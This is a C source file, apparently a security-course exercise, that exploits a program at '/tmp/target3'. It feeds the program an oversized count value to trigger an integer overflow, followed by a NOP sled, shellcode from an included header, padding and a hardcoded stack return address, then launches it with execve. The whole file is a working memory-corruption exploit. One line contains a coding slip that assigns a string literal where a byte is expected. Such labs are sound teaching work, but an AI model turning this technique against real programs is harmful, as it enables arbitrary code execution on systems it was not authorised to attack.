#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"
#define BUFFER 240
#define FP 4
#define RET 4
#define NOP 0x90
#define COUNT_LEN 10

struct widget_t {
  double x;
  double y;
  int count;
};

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;
  args[2] = NULL;
  env[0] = NULL;

  char *count = "4080219172";
  char *buff_address= "\xc8\xd8\xff\xbf"; // 0xbfffd8c8

  if (!(args[1] = (char *)malloc((COUNT_LEN + 1 + BUFFER * sizeof(struct widget_t) + RET + FP) * sizeof(char))))
  {
    exit(EXIT_FAILURE);
  }

  int i, j;
  for (i = 0; i < COUNT_LEN; ++i) {
    args[1][i] = count[i];
  }

  args[1][i++] = ',';
  // printf("Count and \',\' with i = %d\n", i);
 
  for (i = i, j = 0; j < BUFFER * sizeof(struct widget_t) - strlen(shellcode); ++i, ++j)
  {
    args[1][i] = NOP;
  }
  // printf("NOPs with i = %d\n", i);
  
  for (i = i, j = 0; j < strlen(shellcode); ++i, ++j)
  {
    args[1][i] = shellcode[j];
  }
  
  // printf("Shellcode  with i = %d\n", i);
  
  for (i = i, j = 0; j < FP; ++i, ++j) {
    args[1][i] = "A";
  } 
  // printf("FP with i = %d\n", i);
  
  for (i = i, j = 0; j < RET; ++i, ++j) {
    args[1][i] = buff_address[j];
  }
  // printf("RET with i = %d\n", i);

  // printf("%s\n", args[1]);

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
